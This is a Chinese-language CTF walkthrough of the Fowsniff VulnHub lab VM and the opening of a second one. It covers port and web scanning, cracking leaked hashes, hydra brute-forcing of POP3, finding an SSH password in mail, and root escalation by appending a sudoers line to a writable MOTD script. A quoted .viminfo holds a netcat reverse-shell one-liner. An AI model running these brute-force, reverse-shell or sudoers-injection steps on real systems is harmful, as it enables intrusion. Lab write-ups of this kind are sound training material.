539d236734cf0ad55a9a1174bdfdde71 (ECDSA)|_  256 a28fdbae9e3dc9e6a9ca03b1d71b6683 (ED25519)80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))| http-robots.txt: 1 disallowed entry |_/|_http-title: Fowsniff Corp - Delivering Solutions|_http-server-header: Apache/2.4.18 (Ubuntu)110/tcp open  pop3    Dovecot pop3d|_pop3-capabilities: SASL(PLAIN) TOP CAPA USER UIDL RESP-CODES AUTH-RESP-CODE PIPELINING143/tcp open  imap    Dovecot imapd|_imap-capabilities: LOGIN-REFERRALS capabilities have ENABLE Pre-login IDLE listed AUTH=PLAINA0001 more post-login OK SASL-IR LITERAL+ IMAP4rev1 IDMAC Address: 08:00:27:B0:22:14 (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds                                                                            \n\n详细扫描结果发现之前的想法没问题。那我们接下来就可以先从80开始试试，可惜robots.txt里没记录什么有效信息。\n 漏洞扫描\n┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]└─$ sudo nmap --script=vuln 192.168.56.107                 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 23:18 CSTNmap scan report for 192.168.56.107Host is up (0.00032s latency).Not shown: 996 closed tcp ports (reset)PORT    STATE SERVICE22/tcp  open  ssh80/tcp  open  http|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.| http-slowloris-check: |   VULNERABLE:|   Slowloris DOS attack|     State: LIKELY VULNERABLE|     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server&#x27;s resources causing Denial Of Service.|       |     Disclosure date: 2009-09-17|     References:|       http://ha.ckers.org/slowloris/|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750| http-internal-ip-disclosure: |_  Internal IP Leaked: 127.0.1.1| http-enum: |   /robots.txt: Robots file|   /README.txt: Interesting, a readme.|_  /images/: Potentially interesting directory w/ listing on &#x27;apache/2.4.18 (ubuntu)&#x27;|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.110/tcp open  pop3143/tcp open  imapMAC Address: 08:00:27:B0:22:14 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 334.22 seconds                                                                                                           ┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]└─$ sudo nikto -h http://192.168.56.107   [sudo] password for kali: - Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          192.168.56.107+ Target Hostname:    192.168.56.107+ Target Port:        80+ Start Time:         2023-05-25 23:37:26 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.4.18 (Ubuntu)+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.+ /images: IP address found in the &#x27;location&#x27; header. The IP is &quot;127.0.1.1&quot;. See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is &quot;127.0.1.1&quot;. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649+ /: Server may leak inodes via ETags, header found with file /, inode: a45, size: 5674fd157f6d0, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .+ /images/: Directory indexing found.+ /LICENSE.txt: License file found may identify site software.+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/+ 8102 requests: 0 error(s) and 10 item(s) reported on remote host+ End Time:           2023-05-25 23:37:50 (GMT8) (24 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\n漏扫发现&#x2F;images泄露了服务器的内网ip，可惜我们暂时利用不上，其次，发现了LICENSE.txt，README.txt等文件。查看了下也没啥有用的。\nWeb渗透目录发现\n┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]└─$ sudo dirb http://192.168.56.107      -----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Fri May 26 10:42:11 2023URL_BASE: http://192.168.56.107/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                          ---- Scanning URL: http://192.168.56.107/ ----==&gt; DIRECTORY: http://192.168.56.107/assets/                                   ==&gt; DIRECTORY: http://192.168.56.107/images/                                   + http://192.168.56.107/index.html (CODE:200|SIZE:2629)                       + http://192.168.56.107/robots.txt (CODE:200|SIZE:26)                         + http://192.168.56.107/server-status (CODE:403|SIZE:302)                                                                                                   ---- Entering directory: http://192.168.56.107/assets/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                              ---- Entering directory: http://192.168.56.107/images/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                               -----------------END_TIME: Fri May 26 10:42:14 2023DOWNLOADED: 4612 - FOUND: 3\n\n就这么点信息，加上之前漏扫得到的几个文件，都没啥收获。\n看来革新派没啥收获，来点传统的。当然后台可以挂个feroxbster把一些扩展名加上防止错过一些文件。sudo feroxbuster -u http://192.168.56.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,301,302,401,403 -x txt,php,zip,sql,aspx,html\n手动看看网页吧。\n\n主页显示说明服务器遭受了攻击，员工的用户名密码全泄露了。主页还友情提示了我们攻击者还劫持了他们的官方推特@fowsniffcorp，还说可能有泄漏的信息，还有这种事，那还不赶紧看看。\n与此同时，后台挂的扫描结果出来了，发现扫出了个security.txt\n# 192.168.56.107/security.txt       WHAT SECURITY?            &#x27;&#x27;~``           ( o o )+-----.oooO--(_)--Oooo.------+|                            ||          FOWSNIFF          ||            got             ||           PWN3D!!!         ||                            ||       .oooO                ||        (   )   Oooo.       |+---------\\ (----(   )-------+           \\_)    ) /                 (_/Fowsniff Corp got pwn3d by B1gN1nj4!No one is safe from my 1337 skillz!\n\n看来是攻击者B1gN1nj4留下了示威的，那就看看他劫持官推有没有给我们提供什么帮助吧。\n\n发的第一条推就是重量级，好家伙把管理员账号和密钥md5值爆出来。那我们就看看能不能解出来吧。解出来如果B1gN1nj4没改的话不是拿下了。\n\n然而没有天上掉馅饼。解不出来，系统管理员是个讲究人，密码设这么复杂搞的和真的一样。算了看看别的推文，发现置顶推文有说法。这兄弟把系统用户的密码给dump出来了，还有这种好事，赶紧看看。\n\n草，就给我看这个？页面上显示内容在22年8月29号被夹了。那接下来很简单了，穿越回22年8月29号前看一眼就行。\n有能力穿回去的就不用往下看了，没能力的可以用waybackmachine查看以前的网页，真滴好用。\n\n发现老哥是实在人，不仅把所有dump出来的凭证贴出来了，还告诉我们是从email服务器弄出来的。那么说明这些登录凭证很可能是用户的邮箱登录凭证。\n二话不说先把hash丢给hashes破解一下。\n\n除了管理员stone的其他都破解出来了，太对了哥。\n脆弱性利用虽然之前收集到的是邮箱登录凭证，但是万一有人密码复用了呢？先试试ssh吧家人们。\n┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]└─$ sudo crackmapexec ssh 192.168.56.107 -u username -p password --continue-on-success    \n\n然并卵。老老实实试试邮箱吧。\n我们之前就扫描出来110和143开着，pop3以及imap服务都在正常运行。那我们就尝试登陆一下吧。\n在浏览器试一下，发现并没有登录页面。而且提示的错误明显发现肯定是网页用http协议连接出问题了。\n那就在bash里试试吧。\n┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]└─$ telnet 192.168.56.107 110Trying 192.168.56.107...Connected to 192.168.56.107.Escape character is &#x27;^]&#x27;.+OK Welcome to the Fowsniff Corporate Mail Server!user mauer +OKpass carp4ever-ERR [AUTH] Authentication failed.us-ERR Disconnected for inactivity.Connection closed by foreign host.\n\n在bash里试了试发现能连接上，没啥问题，然而一个个手动输密码还要加上协议命令真有点折磨人吧。真得直接hydra爆破。\n┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]└─$ hydra -L username -P password -s 110 192.168.56.107 pop3Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-26 00:46:04[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal![DATA] max 16 tasks per 1 server, overall 16 tasks, 80 login tries (l:10/p:8), ~5 tries per task[DATA] attacking pop3://192.168.56.107:110/[110][pop3] host: 192.168.56.107   login: seina   password: scoobydoo21 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-26 00:46\n\n发现有小可爱没改密码，给我们留下了方便之门。那就登上去看看邮件吧。\n┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]└─$ sudo telnet 192.168.56.107 110Trying 192.168.56.107...Connected to 192.168.56.107.Escape character is &#x27;^]&#x27;.+OK Welcome to the Fowsniff Corporate Mail Server!user seina+OKpass scoobydoo2+OK Logged in.stat+OK 2 2902list+OK 2 messages:1 16222 1280.retr 1+OK 1622 octetsReturn-Path: &lt;stone@fowsniff&gt;X-Original-To: seina@fowsniffDelivered-To: seina@fowsniffReceived: by fowsniff (Postfix, from userid 1000)        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,    tegel@fowsniffSubject: URGENT! Security EVENT!Message-Id: &lt;20180313185107.0FA3916A@fowsniff&gt;Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)From: stone@fowsniff (stone)Dear All,A few days ago, a malicious actor was able to gain entry toour internal email systems. The attacker was able to exploitincorrectly filtered escape characters within our SQL databaseto access our login credentials. Both the SQL and authenticationsystem used legacy methods that had not been updated in some time.We have been instructed to perform a complete internal systemoverhaul. While the main systems are &quot;in the shop,&quot; we havemoved to this isolated, temporary server that has minimalfunctionality.This server is capable of sending and receiving emails, but onlylocally. That means you can only send emails to other users, notto the world wide web. You can, however, access this system via the SSH protocol.The temporary password for SSH is &quot;S1ck3nBluff+secureshell&quot;You MUST change this password as soon as possible, and you will do so under myguidance. I saw the leak the attacker posted online, and I must say that yourpasswords were not very secure.Come see me in my office at your earliest convenience and we&#x27;ll set it up.Thanks,A.J Stone.\n\n简单阅读理解一下，邮件1告诉我们临时的SSH登录密码是”S1ck3nBluff+secureshell”，但是stone警告员工登上了记得改。但是谁知道我们的seina是不是铁头娃，万一就是没改就是玩呢？先试试再说。可惜seina还真改了，可恶。\n别急，我们还有第二封邮件，看看第二封说了啥。\nretr 2+OK 1280 octetsReturn-Path: &lt;baksteen@fowsniff&gt;X-Original-To: seina@fowsniffDelivered-To: seina@fowsniffReceived: by fowsniff (Postfix, from userid 1004)        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)To: seina@fowsniffSubject: You missed out!Message-Id: &lt;20180313185405.101CA1AC2@fowsniff&gt;Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)From: baksteen@fowsniffDevin,You should have seen the brass lay into AJ today!We are going to be talking about this one for a looooong time hahaha.Who knew the regional manager had been in the navy? She was swearing like a sailor!I don&#x27;t know what kind of pneumonia or something you brought back withyou from your camping trip, but I think I&#x27;m coming down with it myself.How long have you been gone - a week?Next time you&#x27;re going to get sick and miss the managerial blowout of the century,at least keep it to yourself!I&#x27;m going to head home early and eat some chicken soup. I think I just got an email from Stone, too, but it&#x27;s probably just some&quot;Let me explain the tone of my meeting with management&quot; face-saving mail.I&#x27;ll read it when I get back.Feel better,SkylerPS: Make sure you change your email password. AJ had been telling us to do that right before Captain Profanity showed up..\n\n我们的反卷斗士baksteen下班直接回家喝鸡汤去了，邮件里还不忘锐评区域经理stone发的邮件多半是在挽尊，说打算回来再看。最后还不忘提醒seina改邮箱密码。\n然而这小子没看AJ的邮件，那不就说明他不知道ssh那事。那他密码铁没改。\n登陆试试。\n┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]└─$ ssh baksteen@192.168.56.107   baksteen@192.168.56.107&#x27;s password:                             _____                       _  __  __        :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|     :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \\ \\ /\\ / / __| &#x27;_ \\| | |_| |_   .sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \\ V  V /\\__ \\ | | | |  _|  _|  -:      y.      dssssssso  |_|  \\___/ \\_/\\_/ |___/_| |_|_|_| |_|   -:      y.      dssssssso                ____                      -:      y.      dssssssso               / ___|___  _ __ _ __        -:      y.      dssssssso              | |   / _ \\| &#x27;__| &#x27;_ \\     -:      o.      dssssssso              | |__| (_) | |  | |_) |  _  -:      o.      yssssssso               \\____\\___/|_|  | .__/  (_) -:    .+mdddddddmyyyyyhy:                              |_|        -: -odMMMMMMMMMMmhhdy/.    .ohdddddddddddddho:                  Delivering Solutions   ****  Welcome to the Fowsniff Corporate Server! ****               ---------- NOTICE: ---------- * Due to the recent security breach, we are running on a very minimal system. * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36baksteen@fowsniff:~$ whoamibaksteenbaksteen@fowsniff:~$ pwd/home/baksteenbaksteen@fowsniff:~$ uname -aLinux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\n果然，舒服了，成功拿到shell。\n提权之所以说这个靶机比较好是因为他里面用户权限管理和分组都弄成了公司里的模式，组分成了root，user以及各个个人组，很真实。\n废话不多说，手动枚举该干的活不能少干。\nbaksteen@fowsniff:~$ sudo -l[sudo] password for baksteen: Sorry, user baksteen may not run sudo on fowsniff.\n\n没权限捏。\nbaksteen@fowsniff:/home$ find / -type f -perm -04000 2&gt;/dev/null/bin/mount/bin/fusermount/bin/umount/bin/ping/bin/su/bin/ntfs-3g/bin/ping6/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/chfn/usr/bin/passwd/usr/bin/procmail/usr/bin/sudo/usr/bin/chsh\n\n也没啥能用的set SUID的bin文件供我们提权。\nbaksteen@fowsniff:/opt/cube$ cat /etc/crontab# /etc/crontab: system-wide crontab# Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user  command17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )#\n\n没啥自动任务。\n老三样整完了，手动看看各个目录里的文件看看吧。\n你可以错过冬日的暖阳，也可以错过夏日的微风，但你一定不能错过多用户环境检索用户遗留的凭证。\nbaksteen@fowsniff:/home$ lltotal 44drwxr-xr-x 11 root     root     4096 Mar  8  2018 ./drwxr-xr-x 22 root     root     4096 Mar  9  2018 ../drwxrwx---  4 baksteen baksteen 4096 Mar 13  2018 baksteen/drwxrwx---  3 mauer    mauer    4096 Mar 11  2018 mauer/drwxrwx---  3 mursten  mursten  4096 Mar 11  2018 mursten/drwxrwx---  3 mustikka mustikka 4096 Mar 11  2018 mustikka/drwxrwx---  3 parede   parede   4096 Mar 11  2018 parede/drwxrwx---  3 sciana   sciana   4096 Mar 11  2018 sciana/drwxrwx---  4 seina    seina    4096 Mar 11  2018 seina/drwxrwx---  4 stone    stone    4096 Mar 13  2018 stone/drwxrwx---  3 tegel    tegel    4096 Mar 11  2018 tegel/baksteen@fowsniff:/home$ grep -R -i pass /home/* 2&gt;/dev/null/home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff:The temporary password for SSH is &quot;S1ck3nBluff+secureshell&quot;/home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff:You MUST change this password as soon as possible, and you will do so under my/home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff:passwords were not very secure.\n\n然而系统管理员把权限配置的很好，根本就进不去其他用户的目录。\n行，看不了别人的还看不了自己的吗，看看baksteen老哥还给我们留下来什么宝贝。\nbaksteen@fowsniff:~$ lltotal 40drwxrwx---  4 baksteen baksteen 4096 Mar 13  2018 ./drwxr-xr-x 11 root     root     4096 Mar  8  2018 ../-rw-------  1 baksteen users       1 Mar 13  2018 .bash_history-rw-r--r--  1 baksteen users     220 Aug 31  2015 .bash_logout-rw-r--r--  1 baksteen users    3771 Aug 31  2015 .bashrcdrwx------  2 baksteen users    4096 Mar  8  2018 .cache/-rw-r--r--  1 baksteen users       0 Mar  9  2018 .lesshsQdrwx------  5 baksteen users    4096 Mar  9  2018 Maildir/-rw-r--r--  1 baksteen users     655 May 16  2017 .profile-rw-r--r--  1 baksteen users      97 Mar  9  2018 term.txt-rw-------  1 baksteen users    2981 Mar 13  2018 .viminfo\n\n有txt先看txt。\nbaksteen@fowsniff:~$ cat term.txt I wonder if the person who coined the term &quot;One Hit Wonder&quot; came up with another other phrases.\n\n没用，再翻翻Maildir，发现里面也没啥有用的东西。\n那接下来就看看.bash_history和.viminfo有没有给我们留下点什么吧。\n出师未捷，.bash_history是空的。再看看.viminfo。\nbaksteen@fowsniff:~$ cat .viminfo # This viminfo file was generated by Vim 7.4.# You may edit it if you&#x27;re careful!# Value of &#x27;encoding&#x27; when this file was written*encoding=utf-8# hlsearch on (H) or off (h):~h# Command Line History (newest to oldest)::wq!:w!:q!:Q!# Search String History (newest to oldest):?/tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc local.machine.ip.addr PORTNUM &gt; /tmp/f# Expression History (newest to oldest):# Input Line History (newest to oldest):# Input Line History (newest to oldest):# Registers:&quot;&quot;-     CHAR    0        e# File marks:&#x27;0  11  0  ~/email_to_seina.txt&#x27;1  8  18  /tmp/pytest/pytest.py&#x27;2  10  11  /tmp/pytest/pytest.py&#x27;3  20  6  /tmp/pytest/pytest.py&#x27;4  23  13  /tmp/pytest/pytest.py&#x27;5  4  14  pytest.py&#x27;6  1  40  /tmp/bak_test/script.sh&#x27;7  33  40  ~/jokes3.txt&#x27;8  46  0  ~/email_to_seina.txt&#x27;9  44  86  ~/email_to_seina.txt# Jumplist (newest first):-&#x27;  11  0  ~/email_to_seina.txt-&#x27;  1  0  ~/email_to_seina.txt-&#x27;  8  18  /tmp/pytest/pytest.py-&#x27;  1  0  /tmp/pytest/pytest.py-&#x27;  10  11  /tmp/pytest/pytest.py-&#x27;  20  6  /tmp/pytest/pytest.py-&#x27;  23  13  /tmp/pytest/pytest.py-&#x27;  4  14  pytest.py-&#x27;  1  0  pytest.py-&#x27;  1  40  /tmp/bak_test/script.sh-&#x27;  33  40  ~/jokes3.txt-&#x27;  1  0  ~/jokes3.txt-&#x27;  46  0  ~/email_to_seina.txt-&#x27;  44  86  ~/email_to_seina.txt-&#x27;  52  39  ~/email_to_seina.txt-&#x27;  33  40  ~/jokes3.txt-&#x27;  1  0  ~/jokes3.txt-&#x27;  1  40  /tmp/bak_test/script.sh-&#x27;  33  40  ~/jokes3.txt-&#x27;  1  0  ~/jokes3.txt-&#x27;  33  40  ~/jokes3.txt-&#x27;  1  0  ~/jokes3.txt-&#x27;  4  14  pytest.py-&#x27;  1  0  pytest.py-&#x27;  1  40  /tmp/bak_test/script.sh-&#x27;  33  40  ~/jokes3.txt-&#x27;  1  0  ~/jokes3.txt-&#x27;  33  40  ~/jokes3.txt-&#x27;  1  0  ~/jokes3.txt-&#x27;  1  40  /tmp/bak_test/script.sh-&#x27;  33  40  ~/jokes3.txt-&#x27;  1  0  ~/jokes3.txt-&#x27;  33  40  ~/jokes3.txt-&#x27;  1  0  ~/jokes3.txt-&#x27;  4  14  pytest.py-&#x27;  1  0  pytest.py-&#x27;  1  40  /tmp/bak_test/script.sh-&#x27;  33  40  ~/jokes3.txt# History of marks within files (newest to oldest):&gt; ~/email_to_seina.txt        &quot;       11      0        ^       11      0        .       11      0        +       46      0        +       40      0        +       43      0        +       44      3        +       44      86        +       26      0        +       31      0        +       36      0        +       41      12        +       42      0        +       44      3        +       44      47        +       44      69        +       45      0        +       47      0        +       23      0        +       17      0        +       16      4        +       15      72        +       5       51        +       5       51        +       5       51        +       10      35        +       10      81        +       12      0        +       11      0&gt; /tmp/pytest/pytest.py        &quot;       8       18        ^       8       19        .       8       18        +       23      22        +       23      24        +       23      35        +       23      28        +       13      21        +       23      0        +       17      10        +       16      30        +       17      5        +       20      6        +       11      3        +       11      0        +       7       1        +       8       5        +       8       5        +       8       10        +       10      12        +       8       18        +       8       19        +       9       9        +       10      0        +       8       18&gt; /opt/cube/cube.sh        &quot;       17      67        ^       17      68        .       17      67        +       15      62        +       1       8        +       3       8        +       17      8        +       1       10        +       17      0        +       17      67&gt; /etc/update-motd.d/cube.sh        &quot;       14      0        ^       14      0        .       13      62        +       13      62&gt; /tmp/place/hi.txt        &quot;       1       0        .       1       0        +       1       0&gt; /tmp/pytest/junk/a.sh        &quot;       3       13        ^       3       14        .       3       13        +       3       13&gt; /tmp/pytest/junk/b        &quot;       1       0&gt; /tmp/pytest/junk/scripto.sh        &quot;       3       4        ^       3       5        .       3       5        +       3       5&gt; pytest.py        &quot;       4       14        ^       4       15        .       4       14        +       4       14&gt; /tmp/bak_test/script.sh        &quot;       1       40        ^       1       41        .       1       40        +       1       40&gt; ~/jokes3.txt        &quot;       33      40        ^       33      41        .       33      30        +       33      30\n\n到底是baksteen老哥，虽然home目录下创的jokes3文件没了,&#x2F;tmp下自己写着玩的shell脚本和python文件都没了。\n但是vim记录还是给我们留下了有用信息：\n&gt; /opt/cube/cube.sh        &quot;       17      67        ^       17      68        .       17      67        +       15      62        +       1       8        +       3       8        +       17      8        +       1       10        +       17      0        +       17      67&gt; /etc/update-motd.d/cube.sh        &quot;       14      0        ^       14      0        .       13      62        +       13      62\n\n我们发现baksteen老哥可以编辑/opt/cube/目录下的cube.sh。\n并且我们知道/etc/update-motd.d目录下是存放用于显示用户登录进来时的信息的脚本的。\n我们看看&#x2F;etc&#x2F;update-motd.d目录下都有啥\nbaksteen@fowsniff:/etc/update-motd.d$ lltotal 24drwxr-xr-x  2 root root 4096 Mar 11  2018 ./drwxr-xr-x 87 root root 4096 Mar 13  2018 ../-rwxr-xr-x  1 root root 1248 Mar 11  2018 00-header*-rwxr-xr-x  1 root root 1473 Mar  9  2018 10-help-text*-rwxr-xr-x  1 root root  299 Jul 22  2016 91-release-upgrade*-rwxr-xr-x  1 root root  604 Nov  5  2017 99-esm*\n\n虽然没有我们最想要的cube.sh，但是没准备写入header了呢？看看再说\nbaksteen@fowsniff:/etc/update-motd.d$ cat 00-header #!/bin/sh##    00-header - create the header of the MOTD#    Copyright (C) 2009-2010 Canonical Ltd.##    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;##    This program is free software; you can redistribute it and/or modify#    it under the terms of the GNU General Public License as published by#    the Free Software Foundation; either version 2 of the License, or#    (at your option) any later version.##    This program is distributed in the hope that it will be useful,#    but WITHOUT ANY WARRANTY; without even the implied warranty of#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the#    GNU General Public License for more details.##    You should have received a copy of the GNU General Public License along#    with this program; if not, write to the Free Software Foundation, Inc.,#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.#[ -r /etc/lsb-release ] &amp;&amp; . /etc/lsb-release#if [ -z &quot;$DISTRIB_DESCRIPTION&quot; ] &amp;&amp; [ -x /usr/bin/lsb_release ]; then#       # Fall back to using the very slow lsb_release utility#       DISTRIB_DESCRIPTION=$(lsb_release -s -d)#fi#printf &quot;Welcome to %s (%s %s %s)\\n&quot; &quot;$DISTRIB_DESCRIPTION&quot; &quot;$(uname -o)&quot; &quot;$(uname -r)&quot; &quot;$(uname -m)&quot;sh /opt/cube/cube.sh\n\n发现这个脚本会在用户登录时执行/opt/cube/cube.sh,并且还是以系统身份。\n至此，我们的提权路径就已经很清晰明了了。\nbaksteen@fowsniff:/etc/update-motd.d$ cd /opt/cube/baksteen@fowsniff:/opt/cube$ lltotal 16drwxrwxrwx 2 root     root  4096 May 25 13:04 ./drwxr-xr-x 6 root     root  4096 Mar 11  2018 ../-rw-rwxr-- 1 parede   users   29 May 25 13:06 cube.sh*\n\ncube.sh虽然拥有者是parede，但是只要是users组就能读写执行。那就别客气了。\n直接进行一个sudoers的写入。\nbaksteen@fowsniff:/opt/cube$ vim cube.shbaksteen@fowsniff:/opt/cube$ cat cube.sh#!/bin/bashecho &#x27;baksteen ALL=(ALL) NOPASSWD:ALL&#x27; &gt;&gt; /etc/sudoersbaksteen@fowsniff:/opt/cube$ exitlogoutConnection to 192.168.56.107 closed.\n\n那么接下来，如果理想的话，就是我们登录时，系统在打印motd信息时执行我们的cube.sh,将baksteen用户写入sudoers，实现提权。\n┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]└─$ ssh baksteen@192.168.56.107                baksteen@192.168.56.107&#x27;s password:    ****  Welcome to the Fowsniff Corporate Server! ****               ---------- NOTICE: ---------- * Due to the recent security breach, we are running on a very minimal system. * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.Last login: Thu May 25 13:20:41 2023 from 192.168.56.144baksteen@fowsniff:~$ sudo -lMatching Defaults entries for baksteen on fowsniff:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser baksteen may run the following commands on fowsniff:    (ALL) NOPASSWD: ALLbaksteen@fowsniff:~$ sudo suroot@fowsniff:/home/baksteen# whoamirootroot@fowsniff:/home/baksteen# cd ~root@fowsniff:~# lltotal 28drwx------  4 root root 4096 Mar  9  2018 ./drwxr-xr-x 22 root root 4096 Mar  9  2018 ../-rw-r--r--  1 root root 3117 Mar  9  2018 .bashrc-rw-r--r--  1 root root  582 Mar  9  2018 flag.txtdrwx------  5 root root 4096 Mar  9  2018 Maildir/drwxr-xr-x  2 root root 4096 Mar  9  2018 .nano/-rw-r--r--  1 root root  148 Aug 17  2015 .profileroot@fowsniff:~# cat flag.txt    ___                        _        _      _   _             _   / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| | | (__/ _ \\ &#x27; \\/ _` | &#x27;_/ _` |  _| || | / _` |  _| / _ \\ &#x27; \\(_-&lt;_|  \\___\\___/_||_\\__, |_| \\__,_|\\__|\\_,_|_\\__,_|\\__|_\\___/_||_/__(_)               |___/  (_)  |--------------  |&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;|  |    R O O T   |  |    F L A G   |  |&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;|  |--------------  |  |  |  |  |  | ---Nice work!This CTF was built with love in every byte by @berzerk0 on Twitter.Special thanks to psf, @nbulischeck and the whole Fofao Team.root@fowsniff:~# \n\n我们发现，开头的cube图标没了，我们的脚本成功执行了。成功拿下root flag。\n总结这台机子的突破部分主要考模拟真实环境下信息收集能力，看你有没有梯子上推特，然后是如何处理页面信息被删除情况下查看以前留下的信息。提权部分主要是看是否对应该手动枚举那些文件是否熟悉以及对motd的理解。\n总之这台机子做的还是不错的，挺有意思。\n","categories":["vulnhub"],"tags":["walkthrough"]},{"title":"[vulnhub]  LampSec-CTF5","url":"/2023/05/24/LAMPSECURITY:%20CTF5/","content":"\n\n\nInfo Gathernmap┌──(kali㉿kali)-[~]└─$ sudo nmap -sn 192.168.56.0/24                     [sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:38 CSTNmap scan report for 192.168.56.1Host is up (0.00013s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 192.168.56.2Host is up (0.00013s latency).MAC Address: 00:50:56:EC:CE:9E (VMware)Nmap scan report for 192.168.56.139Host is up (0.00063s latency).MAC Address: 00:0C:29:7D:00:15 (VMware)Nmap scan report for 192.168.56.254Host is up (0.00042s latency).MAC Address: 00:50:56:FE:21:A5 (VMware)Nmap scan report for 192.168.56.132Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 2.08 